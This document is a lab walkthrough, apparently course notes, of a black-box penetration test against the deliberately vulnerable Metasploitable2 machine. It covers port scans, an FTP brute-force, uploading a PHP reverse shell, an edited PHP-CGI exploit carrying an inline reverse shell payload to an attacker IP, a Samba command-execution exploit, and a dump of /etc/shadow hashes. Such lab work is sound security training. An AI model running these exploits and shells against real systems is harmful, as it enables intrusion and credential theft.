# ðŸ”¬Linux Black Box Pentest

> ðŸ”¬ INE LAB - [Metasploitable2](https://docs.rapid7.com/metasploit/metasploitable-2/)
>
> * Target IP: `10.0.28.76`
> * **Metasploit Framework** is permitted

## Port Scanning & Enumeration <a href="#port-scanning-and-enumeration" id="port-scanning-and-enumeration"></a>

* Obtain the target `IP` address from the `/etc/hosts` file

```bash
cat /etc/hosts
	10.0.25.190 demo.ine.local
ping 10.0.25.190
ping demo.ine.local
mkdir Desktop/Linux
cd Desktop/Linux/ # To store all the notes and files about the target
```

* **Port scanning** with `nmap`

```bash
nmap -sV -p 1-10000 10.0.25.190 -oN nmap_10k.txt
# Scans first 10000 ports
```

```bash
Not shown: 9978 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
51/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
6667/tcp open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
6697/tcp open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)

Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* Check the ports without service banner

```bash
nc -nv 10.0.25.190 512
nc -nv 10.0.25.190 513
# Connected but no banners
```

<figure><img src="../../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

```bash
nc -nv 10.0.25.190 1524

# provides with a shell on the target system!
cat /etc/*release
    DISTRIB_ID=Ubuntu
    DISTRIB_RELEASE=8.04
    DISTRIB_CODENAME=hardy
    DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

ðŸ“Œ There is a BIND SHELL Listener on the port `1524`

<figure><img src="../../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

* Access the web server with a browser
  * `http://10.0.25.190/`
  * There are intentional vulnerable applications present

<figure><img src="../../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

## Targeting <a href="#targeting" id="targeting"></a>

### [vsFTPd](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/ftpd-msf-exp) <a href="#vsftpd" id="vsftpd"></a>

```bash
nmap -sV -sC -p21 10.0.25.190
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 10.0.25.190
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.21.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

* Try `anonymous`:`anonymous` with FTP

```bash
ftp 10.0.25.190
# With anonymous access no files can be accessed
```

<figure><img src="../../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

* **Exploit vsFTPd**

```bash
searchsploit vsftpd
	vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
searchsploit -m 49757
vim 49757.py
chmod +x 49757.py
python3 49757.py 10.0.25.190
# [Errno 111] Connection refused
# Backdoor on port 6200 was removed by the administrator

# Description of the unix/ftp/vsftpd_234_backdoor Metasploit module:
#  This module exploits a malicious backdoor that was added to the 
#  VSFTPD download archive. This backdoor was introduced into the 
#  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
#  according to the most recent information available. This backdoor 
#  was removed on July 3rd 2011.
```

* Same result using `metasploit`.

```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
options
set RHOSTS 10.0.25.190
exploit
    [*] 10.0.25.190:21 - Banner: 220 (vsFTPd 2.3.4)
    [*] 10.0.25.190:21 - USER: 331 Please specify the password.
    [*] Exploit completed, but no session was created.
```

* ðŸ“Œ Exploits might not work because the vulnerability may have been patched!
* Enumerate user accounts via **`SMTP` brute-force**
* Disconnected: `10.0.24.140`

```bash
nmap -sV -sC -p 25 10.0.24.140
```

```bash
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2024-08-05T13:33:54+00:00; -1s from scanner time.
Service Info: Host:  metasploitable.localdomain

Host script results:
|_clock-skew: -1s
```

```bash
msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
setg RHOSTS 10.0.24.140
set UNIXONLY true
run
```

```bash
# Valid user and service accounts
[+] 10.0.24.140:25        - 10.0.24.140:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
```

* Try to brute force `service` with ftp.

```bash
hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.0.24.140 ftp
```

```bash
[21][ftp] host: 10.0.24.140   login: service   password: service
```

<figure><img src="../../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

> ðŸ“Œ FTP credentials found:
>
> * `service`:`service`

```bash
ftp 10.0.24.140
# Use service:service
```

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

```bash
pwd
	Remote directory: /home/service
# User's home directory
cd /
ls
# The "service" user can navigate in the entire file system
exit
```

<figure><img src="../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

* **Upload a `PHP` reverse shell** via FTP to the `/dav` directory and launch it with the browser

```bash
ls -al /usr/share/webshells/php/
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
vim shell.php
# Change the $ip variable to the Kali Attacker VM IP - 10.10.24.6
```

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

```bash
# Login with FTP again and upload the shell.php
cd /
cd /var/www/
put shell.php
    local: shell.php remote: shell.php
    200 EPRT command successful. Consider using EPSV.
    553 Could not create file.
# The user does not have the necessary permissions in /www
cd /var/www/dav
put shell.php
```

<figure><img src="../../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

* Open the browser and run the `shell.php` file
  * `http://10.0.24.140/dav/`

```bash
/bin/bash -i
```

<figure><img src="../../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

### PHP <a href="#php" id="php"></a>

```bash
nmap -sV -sC -p 80 10.0.24.140
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
```

* Try to browse
  * `http://10.0.24.140/phpinfo.php`

<figure><img src="../../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

**Manual/Script Exploitation**

* Find an exploit

```bash
searchsploit php cgi
	PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection | php/remote/18836.py
searchsploit -m 18836
python2 18836.py 10.0.24.140 80
# It executes
```

<figure><img src="../../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

* Modify `pwn_code` variable and insert **PHP reverse shell code**

```bash
vim 18836.py
# insert:
pwn_code = """<?php $sock=fsockopen("110.10.21.5",1234);exec("/bin/sh -i <&4 <>>&4 2>&4");?>"""
# Save and quit
```

```bash
# On another tab
nc -nvlp 1234

# Launch the exploit
python2 18836.py 10.0.24.140 80

```

<figure><img src="../../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

* Automatic MSF `exploit/multi/http/php_cgi_arg_injection` module can be used too.

<figure><img src="../../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

### [SAMBA](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/linux-attacks/samba-unix) <a href="#samba" id="samba"></a>

```bash
nmap -sV -sC -p 445 10.0.24.140
```

```bash
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 2h49m42s, median: 0s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: d1d6a9361621
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: d1d6a9361621
|_  System time: 2024-08-05T10:27:13-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

* Banner grabbing

```bash
nc -nv 10.0.24.140
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Connection refused.

# No banner
```

* Enumerate the exact version of Samba

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
options
set RHOSTS 10.0.24.140
run
```

```bash
[*] 10.0.24.140:445       - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.0.24.140:445       -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.0.24.140:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
searchsploit samba 3.0.20
    Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                          | unix/remote/16320.rb
```

```bash
msfconsole
search samba 3.0.20
use exploit/multi/samba/usermap_script
info
# Description:
#   This module exploits a command execution vulnerability in Samba 
#   versions 3.0.20 through 3.0.25rc3 when using the non-default 
#   "username map script" configuration option. By specifying a username 
#   containing shell meta characters, attackers can execute arbitrary 
#   commands. No authentication is needed to exploit this vulnerability 
#   since this option is used to map usernames prior to authentication!
exploit
```

<figure><img src="../../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Upgrade shell to `meterpreter` session.

<figure><img src="../../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

* ðŸ“Œ This exploit gives back direct `root` access.

```bash
# Dump hashes
cat /etc/shadow
```

```bash
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::                                                                                                                                  
daemon:*:14684:0:99999:7:::                                                                                                                                                                 
bin:*:14684:0:99999:7:::                                                                                                                                                                    
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::                                                                                                                                   
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::

# MD5 hashes can be cracked easily
```
